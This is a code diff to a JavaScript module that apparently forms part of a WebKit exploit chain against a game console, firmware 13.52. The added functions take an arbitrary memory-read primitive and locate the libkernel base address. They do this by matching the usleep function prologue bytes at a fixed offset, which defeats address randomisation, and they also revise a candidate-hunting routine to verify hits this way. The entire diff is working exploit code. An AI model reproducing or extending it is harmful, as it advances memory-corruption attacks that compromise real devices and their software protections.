@@ -1999,6 +1999,21 @@ export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
     return showLibkernelGuesses(webkitBase, nativeFn, log);
 }
 
+/**
+ * lk = fnPtr − k_usleep when Suchi prologue @ fnPtr (no sprx / no decrypt).
+ * Returns null if fnPtr is not usleep entry.
+ */
+export function calcLkFromFnPtr(p, fnPtr, off) {
+    off = off || {};
+    if (!p || !fnPtr || fnPtr.hi < 0x8) return null;
+    const usleepOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
+    if (!checkPrologueAt(p, fnPtr) && read4p(p, fnPtr) !== 0x554889e5)
+        return null;
+    const lk = fnPtr.sub32(usleepOff);
+    if (!lkAligned(lk)) return null;
+    return { lk, usleepOff, fnPtr, via: "fn-usleep-" + usleepOff.toString(16) };
+}
+
 /** ≤2 reads — 13.52 usleep/__error prologue (Suchi dump + BillZai game base trial). */
 export function verifyLibkernelUsleep1352(p, lk, off) {
     off = off || {};
@@ -2360,9 +2375,13 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
         return { done: false, state, phase: "cand-probe", probe, reads: state.reads, log: state.log };
     }
 
-    const raw = read4p(p, addr);
+    const usleepOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
+    const raw = read4p(p, addr.add32(usleepOff));
     probe.raw = raw == null ? "null" : ("0x" + (raw >>> 0).toString(16));
-    probe.magic = classifyProbeMagic(raw, addr, webkitBase, off);
+    probe.magic = raw == null ? "UNMAPPED"
+        : (raw === 0x554889e5 || checkPrologueAt(p, addr.add32(usleepOff)))
+            ? "usleep+" + usleepOff.toString(16)
+            : classifyProbeMagic(raw, addr, webkitBase, off);
     if (raw == null) {
         state.nulls++;
         state.nullRun = (state.nullRun || 0) + 1;
@@ -2384,20 +2403,25 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
         };
     }
 
-    if (raw != null && probe.magic === "SCE") {
-        saveLibkernelSession(addr, null);
-        return {
-            done: true,
-            ok: true,
-            lk: addr,
-            stubs: 0,
-            source: "hunt-cand+" + c.why,
-            state,
-            phase: "cand-hit",
-            reads: state.reads,
-            probe,
-            log: state.log,
-        };
+    if (raw != null && probe.magic.startsWith("usleep+")) {
+        const v = verifyLibkernelUsleep1352(p, addr, off);
+        if (v.ok) {
+            saveLibkernelSession(addr, null);
+            return {
+                done: true,
+                ok: true,
+                lk: addr,
+                strong: v.strong,
+                stubs: 0,
+                source: "hunt-suchi+" + c.why,
+                state,
+                phase: "cand-hit",
+                reads: state.reads,
+                probe,
+                log: state.log,
+            };
+        }
+        probe.magic = "usleep-miss";
     }
 
     return {
